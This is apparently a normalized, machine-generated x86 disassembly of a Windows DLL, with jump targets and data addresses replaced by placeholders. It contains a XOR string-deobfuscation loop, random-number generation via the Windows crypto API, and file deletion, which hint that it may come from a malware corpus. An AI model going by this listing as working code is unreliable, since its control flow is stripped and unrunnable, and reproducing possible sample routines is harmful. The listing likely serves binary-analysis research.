mov [ esi + 0x14 ] eax
call sub_10078600
add esp 0xc
pop edi
mov eax esi
pop ebx
pop ecx
retn
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x14 ] edi
mov eax [ esi + 0x14 ]
cmp eax edi
je r-xdata
sub_10007600
push ebp
mov ebp esp
push 0xffffffff
push sub_1007fd81
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] 0x2
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax edi
je r-xdata
call [ r--data ]
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov eax [ esi + 0x8c ]
mov [ esi + 0x70 ] r--data
cmp eax edi
je r-xdata
push eax
call sub_10065045
add esp 0x4
mov eax [ esi + 0x7c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
push eax
call sub_10065045
add esp 0x4
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edi
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] edi
mov [ esi + 0xc ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
push edx
call sub_10065045
add esp 0x4
sub_10007703
push eax
push [ fs : 0x0 ]
lea eax [ esp + 0xc ]
sub esp [ esp + 0xc ]
push ebx
push esi
push edi
mov [ eax ] ebp
mov ebp eax
mov eax [ rw-data ]
xor eax ebp
push eax
mov [ ebp - 0x10 ] eax
push [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
retn
sub_10007739
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10028b72
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_100077e0
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ edx + 0x3c4 ]
push esi
mov esi [ edx + 0x3c0 ]
push edi
mov edi eax
xor eax eax
cmp esi ecx
je r-xdata
mov esi [ edx + 0x3a0 ]
mov edx [ edx + 0x3a4 ]
cmp esi edx
je r-xdata
cmp [ esi ] edi
je r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi ]
cmp edi [ ecx ]
je r-xdata
cmp esi ecx
je r-xdata
add esi 0x8
cmp esi ecx
jne r-xdata
mov edx [ ebp + 0x8 ]
push 0x0
push ebx
push edx
add ecx 0x20
push ecx
call sub_1000e7f0
mov ecx [ esi ]
mov eax [ ecx + 0x28 ]
add esi 0x4
cmp esi edx
jne r-xdata
mov ecx [ edx + 0x3d0 ]
mov edi [ edx + 0x3b0 ]
mov edx [ edx + 0x3b4 ]
sub edx edi
mov eax 0x38e38e39
imul edx
sar edx 0x3
mov eax edx
shr eax 0x1f
dec ecx
add eax edx
cmp eax ecx
ja r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea ecx [ ecx + ecx * 8 ]
mov eax [ edi + ecx * 4 + 0x20 ]
lea edx [ edi + ecx * 4 ]
mov ecx [ esi + 0x4 ]
cmp ecx eax
jae r-xdata
push r--data
call sub_1003b4a6
xor eax eax
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
lea edi [ ecx + ebx ]
cmp edi eax
jae r-xdata
sub eax ecx
mov edi eax
mov edi ebx
jmp r-xdata
mov edx [ edx + 0x1c ]
mov eax [ ebp + 0x8 ]
push edi
add edx ecx
push edx
push eax
call sub_10078600
add esp 0xc
add [ esi + 0x4 ] edi
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_100078e0
push esi
mov esi [ ecx + 0xc ]
test esi esi
je r-xdata
pop esi
retn
push esi
call sub_1001f390
push esi
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
sub_10007900
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
cmp edi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn 0x4
mov eax edi
call sub_10054340
push 0xffffffff
push 0x0
lea eax [ edi + 0x94 ]
push eax
lea ecx [ esi + 0x94 ]
call sub_1001c310
mov ecx [ edi + 0xb0 ]
mov [ esi + 0xb0 ] ecx
mov edx [ edi + 0x90 ]
mov [ esi + 0x90 ] edx
sub_1000794b
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_10054678
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_10012991
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_100551f3
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_100159e2
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1000a03a
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10007a60
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
cmp [ esi ] 0x0
jne r-xdata
mov eax [ esi ]
pop esi
mov esp ebp
pop ebp
retn
push 0x0
lea ecx [ ebp - 0x4 ]
call sub_100067d1
cmp [ esi ] 0x0
jne r-xdata
lea ecx [ ebp - 0x4 ]
call sub_1002470e
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ esi ] eax
sub_10007aa0
push ebp
mov ebp esp
push esi
mov esi ecx
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] 0x0
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_10065045
add esp 0x4
xor eax eax
test [ ebp + 0x8 ] 0x1
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] 0x0
mov [ esi + 0xc ] ax
je r-xdata
mov edx [ esi + 0xc ]
push edx
call sub_10065045
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10065045
add esp 0x4
sub_10007b0e
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10020c77
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_10007bc0
push ebp
mov ebp esp
sub esp 0x14
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
je r-xdata
mov eax [ ecx + 0x10 ]
and eax [ ecx + 0xc ]
mov esi 0x1
test al 0x4
je r-xdata
push 0x0
push 0x0
call sub_1002050e
test al 0x2
je r-xdata
call sub_1004a1e9
mov edi eax
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x14 ]
mov [ ebp + 0x8 ] r--data
call sub_10052185
push r--data
lea ecx [ ebp - 0x14 ]
push ecx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1002050e
call sub_1004a1e9
lea ecx [ ebp + 0x8 ]
push ecx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0x8 ] r--data
call sub_10052185
push r--data
lea edx [ ebp - 0x14 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1002050e
int3
call sub_1004a1e9
lea edx [ ebp + 0x8 ]
push edx
lea ecx [ ebp - 0x14 ]
mov edi eax
mov [ ebp + 0x8 ] r--data
call sub_10052185
push r--data
lea eax [ ebp - 0x14 ]
push eax
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x4 ] edi
mov [ ebp - 0x14 ] r--data
call sub_1002050e
sub_10007c8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_100789ea
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1007b0e0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_10007cf0
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_1003b4a6
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_10077d10
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_10007d7b
push 0x28
mov eax sub_1007e4e0
call sub_10050d0f
mov ebx [ ebp + 0x8 ]
and [ ebp - 0x10 ] 0x0
test ebx ebx
je r-xdata
push 0x6
pop eax
call sub_1001a1b3
retn
cmp [ ebx ] 0x0
jne r-xdata
push 0x8
call sub_1005ac7e
mov esi eax
pop ecx
mov [ ebp + 0x8 ] esi
and [ ebp - 0x4 ] 0x0
test esi esi
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
test ecx ecx
je r-xdata
lea ecx [ ebp - 0x34 ]
call sub_10062210
add eax 0x1c
mov eax ecx
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
test [ ebp - 0x10 ] 0x1
mov [ ebx ] esi
je r-xdata
push eax
lea ecx [ ebp - 0x34 ]
call sub_100216c0
and [ esi + 0x4 ] 0x0
mov [ ebp - 0x10 ] 0x1
mov [ esi ] r--data
jmp r-xdata
sub_10007e00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
cmp [ ecx + 0x14 ] 0x10
jb r-xdata
add ecx [ ebp + 0x8 ]
push eax
movsx eax [ ebp + 0x10 ]
push eax
push ecx
call sub_10078970
add esp 0xc
pop ebp
retn 0xc
mov ecx [ ecx ]
mov al [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ ecx + edx ] al
pop ebp
retn 0xc
mov ecx [ ecx ]
sub_10007e40
push ebp
mov ebp esp
push 0xffffffff
push sub_10080bf6
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ecx ebx
call sub_100290c0
test eax eax
je r-xdata
mov ecx ebx
call sub_10052960
test eax eax
jne r-xdata
mov eax [ rw-data ]
push r--data
xor edi edi
mov ecx rw-data
call sub_1005e510
test eax eax
je r-xdata
mov eax 0x7
jmp r-xdata
mov ecx ebx
call sub_100640c0
test eax eax
je r-xdata
xor edi edi
mov [ ebp - 0x98 ] 0xf
mov [ ebp - 0x9c ] edi
mov [ ebp - 0xac ] 0x0
lea edx [ ebp - 0x80 ]
lea eax [ edi + 0x7d ]
mov [ ebp - 0x4 ] edi
call sub_1000a6f0
push edi
push 0x1
push edi
push edi
lea eax [ ebp - 0xcc ]
push eax
call [ CryptAcquireContextW@IAT ]
test eax eax
jne r-xdata
push 0xffffffff
push edi
push rw-data
lea ecx [ ebx + 0x40 ]
call sub_1001c310
mov edi ebx
call sub_10012640
test eax eax
je r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
mov ecx ebx
call sub_1005b9c0
mov ecx ebx
call sub_100572c0
mov ecx ebx
call sub_1002a780
test eax eax
je r-xdata
mov eax 0x8
jmp r-xdata
mov eax [ ebp - 0xcc ]
lea edx [ ebp - 0x18 ]
push edx
push 0x6
push eax
call [ CryptGenRandom@IAT ]
push edi
test eax eax
jne r-xdata
cmp [ ebp - 0x98 ] 0x10
jb r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x8d
call sub_1000a6f0
mov eax 0x5
jmp r-xdata
mov ecx ebx
call sub_100474c0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0xac
call sub_1000a6f0
mov eax 0x6
jmp r-xdata
mov edx [ ebp - 0xcc ]
push edx
call [ CryptReleaseContext@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0xcc ]
push ecx
call [ CryptReleaseContext@IAT ]
lea ecx [ ebp - 0xac ]
call sub_10021250
mov eax 0x2
jmp r-xdata
mov eax 0x1
jmp r-xdata
mov ecx [ ebp - 0xac ]
push ecx
call sub_10065045
add esp 0x4
mov ecx ebx
call sub_100373d0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x21
call sub_1000a6f0
push 0x6
lea ecx [ ebp - 0x18 ]
lea esi [ ebp - 0xc8 ]
call sub_1006a560
add esp 0x4
push eax
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0x1
call sub_100172f0
mov ecx esi
mov [ ebp - 0x4 ] 0x0
call sub_10021250
cmp [ ebp - 0x98 ] 0x10
mov eax [ ebp - 0xac ]
jae r-xdata
lea ecx [ ebp - 0xac ]
call sub_10021250
mov eax 0x3
jmp r-xdata
call sub_1003a6a0
mov esi eax
test esi esi
jne r-xdata
lea edx [ ebp - 0x88 ]
mov eax 0x3b
call sub_1000a6f0
push 0x9
lea ecx [ ebp - 0x2c ]
push ecx
push 0xffffffff
push eax
push 0x1
push edi
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0xac ]
push 0x0
lea edx [ ebx + 0x138 ]
push ebx
mov ecx esi
call sub_1006a680
test eax eax
je r-xdata
lea eax [ esi + 0x9 ]
jmp r-xdata
lea edx [ ebx + 0x40 ]
push edx
lea edx [ ebp - 0x2c ]
call sub_10049460
mov edi ebx
call sub_10012640
test eax eax
je r-xdata
lea ecx [ ebp - 0xac ]
call sub_10021250
mov eax 0x4
jmp r-xdata
push esi
call [ LocalFree@IAT ]
push ebx
call sub_100674e0
test eax eax
je r-xdata
lea edx [ ebp - 0x80 ]
mov eax 0x91
call sub_1000a6f0
lea ecx [ ebp - 0xac ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_10021250
lea edx [ ebp - 0x80 ]
mov eax 0x8d
call sub_1000a6f0
lea ecx [ ebp - 0xac ]
call sub_10021250
mov eax 0x5
jmp r-xdata
push ebx
call sub_1001be20
test eax eax
je r-xdata
lea edx [ ebp - 0x90 ]
mov eax 0x7c
call sub_1000a6f0
mov eax 0xb
jmp r-xdata
mov ecx ebx
call sub_1000e3e0
test eax eax
je r-xdata
lea edx [ ebp - 0x78 ]
mov eax 0xf6
call sub_1000a6f0
mov eax 0xc
jmp r-xdata
xor eax eax
lea edx [ ebp - 0x90 ]
mov eax 0x86
call sub_1000a6f0
mov eax 0xd
jmp r-xdata
sub_100081ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_1002d1db
pop ecx
test eax eax
je r-xdata
push esi
call sub_1007c817
pop ecx
jmp r-xdata
test [ esi + 0xc ] 0x4000
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebp
retn
xor eax eax
push esi
call sub_1001742d
push eax
call sub_1000507e
pop ecx
neg eax
pop ecx
sbb eax eax
jmp r-xdata
sub_10008200
push ebp
mov ebp esp
push ebx
push edi
mov ebx ecx
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push eax
call sub_1000eb90
add esp 0x4
mov [ esi ] eax
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
push eax
call sub_1000eb90
add esp 0x4
mov [ esi + 0x8 ] eax
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea eax [ edi + 0x2 ]
push eax
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x4 ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
mov eax [ esi + 0xc ]
test eax eax
je r-xdata
pop edi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea ecx [ edi + 0x2 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0xc ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0xc ] 0x0
push ebx
call [ lstrlenW@IAT ]
lea edi [ eax + eax ]
lea edx [ edi + 0x2 ]
push edx
push 0x40
call [ LocalAlloc@IAT ]
push edi
push ebx
push eax
mov [ esi + 0x10 ] eax
call sub_10078600
add esp 0xc
push eax
call [ LocalFree@IAT ]
mov [ esi + 0x10 ] 0x0
sub_100082ec
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xe0434352
je r-xdata
call sub_10044fed
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp eax 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_10044fed
dec [ eax + 0x90 ]
cmp eax 0xe06d7363
jne r-xdata
call sub_10044fed
and [ eax + 0x90 ] 0x0
jmp sub_1002423f
sub_1000833b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10012991
mov [ eax ] 0x16
call sub_1002788e
or eax 0xffffffff
pop ebp
retn
call sub_10012991
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_1002788e
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_1001e654
call sub_10036280
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_10012991
mov [ eax ] 0x22
sub_100083b2
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_10054678
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_100471a2
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_1000906c
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10008452
push 0x14
mov eax sub_1007e60b
call sub_10050d0f
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100067d1
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10007a60
mov ecx [ ebp + 0x8 ]
push eax
call sub_100033a0
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_1002470e
mov eax edi
call sub_1001a1b3
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_1004e38b
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_1001c4b0
push edi
call sub_10009b69
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_10036aac
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1002050e
sub_100084ef
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call [ DeleteFileW@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
xor eax eax
pop ebp
retn
push eax
call sub_100249b4
pop ecx
or eax 0xffffffff
pop ebp
retn
test eax eax
je r-xdata
sub_10008520
push ebp
mov ebp esp
push 0xffffffff
push sub_10081dd9
mov eax [ fs : 0x0 ]
push eax
sub esp 0x90
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
push 0x20
mov esi ecx
mov [ ebp - 0x9c ] ebx
call sub_1005ac7e
mov edi eax
add esp 0x4
mov [ ebp - 0x9c ] edi
mov [ ebp - 0x4 ] ebx
cmp edi ebx
je r-xdata
xor edi edi
xor eax eax
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
mov [ edi ] ax
push 0x9
push r--data
mov ecx edi
mov [ ebp - 0x4 ] 0x1
call sub_1005e3c0
mov [ edi + 0x1c ] ebx
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffdf
and edx 0xff
mov [ ebp + eax * 2 - 0x2c ] dx
inc eax
cmp eax 0x7
jb r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
xor eax eax
test [ ebp + 0x8 ] 0x4
mov [ ebp - 0x1e ] ax
jne r-xdata
test [ ebp + 0x8 ] 0x10
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xd9
call sub_1001bb80
lea edx [ ebp - 0x50 ]
mov eax 0x4b
call sub_1001bb80
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1002ea40
test [ ebp + 0x8 ] 0x20
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x59
call sub_1001bb80
lea edx [ ebp - 0x58 ]
mov eax 0x12
call sub_1001bb80
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1002ea40
test [ ebp + 0x8 ] 0x8
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xda
call sub_1001bb80
lea edx [ ebp - 0x5c ]
mov eax 0x5d
call sub_1001bb80
mov eax edx
push eax
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1002ea40
test [ ebp + 0x8 ] 0x1
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0x13e
call sub_1001bb80
lea edx [ ebp - 0x58 ]
mov eax 0x83
call sub_1001bb80
mov ecx edx
push ecx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1002ea40
test [ ebp + 0x8 ] 0x2
jne r-xdata
lea edx [ ebp - 0x1c ]
mov eax 0xf4
call sub_1001bb80
lea edx [ ebp - 0x5c ]
mov eax 0xce
call sub_1001bb80
push edx
lea edx [ ebp - 0x1c ]
lea ecx [ ebp - 0x2c ]
call sub_1002ea40
push edi
call sub_1003a3e0
cmp edi ebx
je r-xdata
lea edx [ ebp - 0x68 ]
mov eax 0x3c
call sub_1001bb80
lea edx [ ebp - 0x98 ]
mov eax 0x3f
call sub_1001bb80
mov eax edx
push eax
lea edx [ ebp - 0x68 ]
lea ecx [ ebp - 0x2c ]
call sub_1002ea40
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1004c3b6
mov esp ebp
pop ebp
retn
cmp [ edi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] ebx
push edi
mov [ edi ] cx
call sub_10065045
add esp 0x4
mov eax [ edi ]
push eax
call sub_10065045
add esp 0x4
sub_10008740
mov eax [ esi + 0x8 ]
mov ecx [ eax ]
mov edx [ ecx ]
push edi
lea edi [ esi + 0x10 ]
